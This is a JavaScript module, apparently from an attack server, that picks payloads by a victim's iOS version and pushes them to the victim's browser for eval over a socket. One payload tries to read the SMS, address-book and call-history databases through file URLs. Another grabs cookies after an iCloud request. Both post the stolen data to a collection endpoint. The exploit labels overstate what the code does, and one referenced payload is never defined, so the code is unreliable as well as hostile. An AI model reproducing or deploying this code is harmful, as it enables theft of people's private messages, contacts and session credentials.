class ExploitIOS {
    
    static vulnerabilities = [
        {
            name: 'WebKit RCE',
            minVersion: 10,
            maxVersion: 14,
            payload: this.webKitRCE
        },
        {
            name: 'Safari UXSS',
            minVersion: 12,
            maxVersion: 16,
            payload: this.safariUXSS
        },
        {
            name: 'File System Access',
            minVersion: 9,
            maxVersion: 15,
            payload: this.fileSystemAccess
        }
    ];
    
    static launch(socket, victim) {
        const version = victim.iosVersion || 0;
        
        this.vulnerabilities.forEach(vuln => {
            if (version >= vuln.minVersion && version <= vuln.maxVersion) {
                console.log(`ðŸ’¥ [${victim.id}] Lancement exploit: ${vuln.name}`);
                vuln.payload(socket, victim);
            }
        });
    }
    
    static webKitRCE(socket, victim) {
        const payload = `
            // Exploit WebKit
            if(window.webkit && window.webkit.messageHandlers) {
                try {
                    window.webkit.messageHandlers.shell.postMessage({
                        cmd: 'info',
                        data: {
                            ua: navigator.userAgent,
                            locale: navigator.language
                        }
                    });
                } catch(e) {}
            }
            
            // Tentative d'accÃ¨s aux fichiers
            var files = [
                'file:///private/var/mobile/Library/SMS/sms.db',
                'file:///private/var/mobile/Library/AddressBook/AddressBook.sqlitedb',
                'file:///private/var/mobile/Library/CallHistoryDB/CallHistory.storedata'
            ];
            
            files.forEach(function(file) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', file, true);
                xhr.onload = function() {
                    if(this.status === 200) {
                        fetch('/api/collect', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                victimId: '${victim.id}',
                                type: 'ios_file',
                                data: {path: file, data: this.responseText.substring(0, 500)}
                            })
                        });
                    }
                };
                xhr.send();
            });
        `;
        
        socket.emit('eval', payload);
    }
    
    static safariUXSS(socket, victim) {
        const payload = `
            // Exploit Safari UXSS
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://www.icloud.com', true);
            xhr.withCredentials = true;
            xhr.onload = function() {
                // RÃ©cupÃ©rer les cookies
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        victimId: '${victim.id}',
                        type: 'cookies',
                        data: document.cookie
                    })
                });
            };
            xhr.send();
        `;
        
        socket.emit('eval', payload);
    }
}

module.exports = ExploitIOS;
